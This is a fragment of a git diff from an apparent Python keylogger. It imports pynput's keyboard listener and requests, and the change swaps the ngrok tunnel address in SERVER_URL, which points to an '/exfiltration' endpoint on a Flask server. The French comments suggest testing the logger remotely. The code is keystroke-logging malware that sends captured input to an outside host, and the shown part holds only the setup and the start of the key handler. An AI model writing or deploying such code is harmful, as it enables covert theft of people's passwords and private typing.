@@ -2,7 +2,7 @@ from pynput import keyboard
 import requests
 
 # L'URL du serveur Flask (assurez-vous que le serveur est en cours d'exécution)
-SERVER_URL = "https://998d3a7ffb5d.ngrok-free.app/exfiltration"  # Utilise l'IP de ton serveur Flask si tu veux tester à distance
+SERVER_URL = "https://38ac1df687ae.ngrok-free.app/exfiltration"  # Utilise l'IP de ton serveur Flask si tu veux tester à distance
 
 def on_press(key):
     try:
